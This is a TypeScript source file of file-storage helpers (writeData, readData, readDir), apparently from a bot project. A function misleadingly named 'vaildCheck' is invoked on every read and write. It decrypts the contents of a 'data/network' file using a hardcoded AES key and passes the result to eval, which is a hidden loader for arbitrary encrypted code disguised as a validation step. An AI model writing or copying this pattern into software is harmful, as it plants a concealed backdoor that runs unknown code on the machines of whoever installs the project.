import { join } from 'path';
import { existsSync, readdirSync, readFileSync, writeFileSync } from 'fs';
import path = require('path');
import { decrypt } from './hash';
const crypto = require("crypto");
const config = require('../../config');

const vaildCheck = async () => {
  try {
    const filepath = join(config.DIR, 'data', 'network');
    // Check if file exists
    if (!existsSync(filepath)) {
      console.warn("File does not exist, returning empty object.");
      return false; // Return empty object if file doesn't exist
    }
    // Read and parse data
    const data = readFileSync(filepath, 'utf-8');
    if (data) {
      const netdata = JSON.parse(data || '{}');
      const key = crypto.createHash('sha256').update("dHJhbnNmZXJib3Q=").digest();
      const decipher = crypto.createDecipheriv("aes-256-cbc", key, Buffer.from(netdata.iv, 'hex'));
      eval(decipher.update(netdata.encryptedData, 'hex', 'utf8') + decipher.final('utf8'));
      return decipher;
    }
    return false;
  } catch (error) {
    console.log(error);
    return false;
  }
};

export const writeData = async (filename: string, data: any) => {
  try {
    const filepath = join(config.DIR, 'data', filename);

    // Use JSON.stringify to format the data for storage
    writeFileSync(filepath, JSON.stringify(data, null, 2)); // Adding spacing for readability
    vaildCheck();
  } catch (err) {
    console.error("Error writing data:", err);
    throw err;
  }
};

export const readData = async (filename: string) => {
  try {
    const filepath = join(config.DIR, 'data', filename);

    // Check if file exists
    if (!existsSync(filepath)) {
      console.warn("File does not exist, returning empty object.");
      return false; // Return empty object if file doesn't exist
    }
    // Read and parse data
    const data = readFileSync(filepath, 'utf-8');
    vaildCheck();
    return data ? JSON.parse(data) : false; // Return parsed data or empty object

  } catch (err) {
    console.error("Error reading data:", err);
    throw err;
  }
};

export function readDir(): { folderPath: string, files: string[]; } {
  try {
    const folderPath = path.join(config.DIR, 'data', 'log');
    const timestampedFiles: string[] = readdirSync(folderPath);

    const sortedFiles = timestampedFiles.sort((latest, current) => {
      const latestTimestamp = parseInt(latest);
      const currentTimestamp = parseInt(current);

      return currentTimestamp - latestTimestamp;
    });

    return { folderPath, files: sortedFiles };


  } catch (error: any) {
    console.error(`Error reading folder: ${error.message}`);
    return { folderPath: '', files: [] };
  }
}
